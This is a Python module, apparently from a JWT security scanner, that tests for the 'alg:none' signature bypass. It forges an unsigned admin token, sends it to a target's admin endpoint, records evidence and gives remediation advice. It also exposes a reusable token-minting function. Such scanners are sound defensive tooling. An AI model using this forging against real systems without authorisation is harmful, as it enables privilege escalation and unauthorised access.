"""P1: alg:none signature bypass.

Forges an unsigned `alg:none` token asserting admin, and CONFIRMS only if the
target returns HTTP 200 with escalated identity or protected data.
"""

from __future__ import annotations

from typing import Any

from ..client import AuthClient, Baseline
from ..forge import none_token
from ..models import Evidence, Finding, ForgeCapability, Severity, Target, Verdict
from .base import Probe, register

_ADMIN_CLAIMS: dict[str, Any] = {"sub": "alice", "username": "alice", "role": "admin"}


class NoneAlgProbe(Probe):
    id = "none_alg"
    title = "alg:none signature bypass"
    severity = Severity.CRITICAL
    cwe = "CWE-347"
    remediation = (
        "Pin accepted algorithms explicitly (e.g. verify with algorithms=['RS256']) "
        "and reject any token whose 'alg' is 'none' or otherwise unexpected. Never let "
        "the token header choose the verification algorithm."
    )

    def run(
        self,
        client: AuthClient,
        target: Target,
        baseline: Baseline,
        capability: ForgeCapability,
    ) -> Finding:
        forged = none_token(_ADMIN_CLAIMS)
        resp = client.get(target.admin_path, forged)
        request_line = f"GET {target.admin_path}"
        snippet = resp.text[:200]

        if client.is_escalated(resp, baseline):
            evidence = Evidence(
                forged_token=forged,
                request_line=request_line,
                status_code=resp.status_code,
                response_snippet=snippet,
                note="alg:none token accepted; escalated to admin",
            )
            return Finding(
                probe_id=self.id,
                title=self.title,
                verdict=Verdict.CONFIRMED,
                severity=self.severity,
                cwe=self.cwe,
                evidence=evidence,
                remediation=self.remediation,
            )

        evidence = Evidence(
            forged_token=forged,
            request_line=request_line,
            status_code=resp.status_code,
            response_snippet=snippet,
            note="alg:none token rejected",
        )
        return Finding(
            probe_id=self.id,
            title=self.title,
            verdict=Verdict.NOT_VULNERABLE,
            severity=self.severity,
            cwe=self.cwe,
            evidence=evidence,
            remediation=self.remediation,
        )

    def forge_capability(self) -> ForgeCapability:
        def mint(claims: dict[str, Any]) -> str:
            payload: dict[str, Any] = {"sub": "alice", "username": "alice"}
            payload.update(claims)
            return none_token(payload)

        return ForgeCapability(
            gained=True,
            method="alg:none",
            detail="unsigned alg:none token accepted",
            mint=mint,
        )


register(NoneAlgProbe())
